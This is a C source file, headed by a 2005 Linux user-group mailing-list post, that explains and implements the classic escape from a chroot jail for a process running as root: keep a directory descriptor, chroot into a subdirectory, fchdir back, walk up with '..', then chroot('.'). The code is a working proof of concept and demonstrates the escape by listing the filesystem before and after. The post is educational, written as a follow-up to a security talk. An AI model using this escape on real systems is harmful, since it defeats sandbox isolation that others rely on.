//  vim:set ts=4 sw=4 ai nocindent:

/*

From: "Michael C. Toren" <mct@toren.net>
To: Philadelphia Linux User's Group Discussion List	<plug@lists.phillylinux.org>
Subject: Re: [PLUG] Thanks for inviting me to talk
Date: Thu, 8 Dec 2005 15:42:50 -0500

On Thu, Dec 08, 2005 at 07:52:59AM -0500, Mark Dominus wrote:
> The main page for the talk is at:
> 
>         http://perl.plover.com/classes/unixsec/

I mentioned last night that it was possible on modern systems for root to
easily break out of a chroot jail, but unfortunately I couldn't remember
the specific incantation at the time.  I've seen been able to refresh my
memory; the procedure is as follows:

    1) Open a file descriptor pointing to the current working directory.

    2) Create a temporary directory within the jail, and chroot() to it.

    3) Using fchdir(), change the working directory to the file descriptor
       saved from step 1.

    4) Change the working directory to ".." as many times as necessary to
       reach the top of the real file system.

    5) chroot() to the current working directory.

An example may be found at:

    http://michael.toren.net/code/tmp/jailbird.c

and executed as:

    gcc -static -Wall -o jailbird jailbird.c && sudo chroot . ./jailbird dir

This works today on my Linux 2.6.12 system, but may not work on others.
For example, the chroot() man page on FreeBSD 5.3 indicates that if
kern.chroot_allow_open_directories is set to zero, the chroot() call
will fail if there are any open directories.

-mct

-- 
perl -e'$u="\4\5\6";sub H{8*($_[1]%79)+($_[0]%8)}sub G{vec$u,H(@_),1}sub S{vec
($n,H(@_),1)=$_[2]}$_=q^{P`clear`;for$iX){PG($iY)?"O":" "forX8);P"\n"}for$iX){
forX8){$c=scalar grep{G@$_}[$i-1Y-1Z-1YZ-1Y+1ZY-1ZY+1Z+1Y-1Z+1YZ+1Y+1];S$iY,G(
$iY)?$c=~/[23]/?1:0:$c==3?1:0}}$u=$n;select$M,$C,$T,.2;redo}^;s/Z/],[\$i/g;s/Y
/,\$_/xg;s/X/(0..7/g;s/P/print+/g;eval' #     Michael C. Toren <mct@toren.net>

*/

#include <sys/types.h>
#include <dirent.h>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>

void pfatal(char *err)
{
	perror(err);
	exit(1);
}

/* Simulate a "/usr/bin/find . -print" */
void find(char *dirname)
{
	DIR *fd;
	struct dirent *d;

	if ((fd = opendir(dirname)) == NULL)
		pfatal("opendir");

	while ((d = readdir(fd)))
	{
		char fullname[MAXPATHLEN];
		struct stat statbuf;

		if (strcmp(".", d->d_name) == 0)
			continue;
		if (strcmp("..", d->d_name) == 0)
			continue;

		snprintf(fullname, MAXPATHLEN-1, "%s/%s", dirname, d->d_name);

		if (lstat(fullname, &statbuf) != 0)
			pfatal("lstat");

		printf("   %s\n", fullname);

		if (S_ISDIR(statbuf.st_mode))
			find(fullname);
	}

	closedir(fd);
}

int main(int argc, char *argv[])
{
	char *tmpdir;
	DIR *fd;
	int i;

	if (argc != 2)
	{
		fprintf(stderr, "Usage: %s <tmpdirname>\n", argv[0]);
		exit(1);
	}

	tmpdir = argv[1];

	if (mkdir(tmpdir, 0777) != 0 && errno != EEXIST)
		pfatal("mkdir");

	printf("\nInitial file system view:\n");
	find("/");

	if ((fd = opendir(".")) == NULL)
		pfatal("opendir");

	if (chroot(tmpdir) != 0)
		pfatal("chroot");

	if (fchdir(dirfd(fd)) != 0)
		pfatal("fchdir");

	for (i = 0; i < 100; i++)
		if (chdir("..") != 0)
			pfatal("chdir");

	if (chroot(".") != 0)
		pfatal("chroot");

	printf("\nNew file system view:\n");
	find("/");
	exit(0);
}
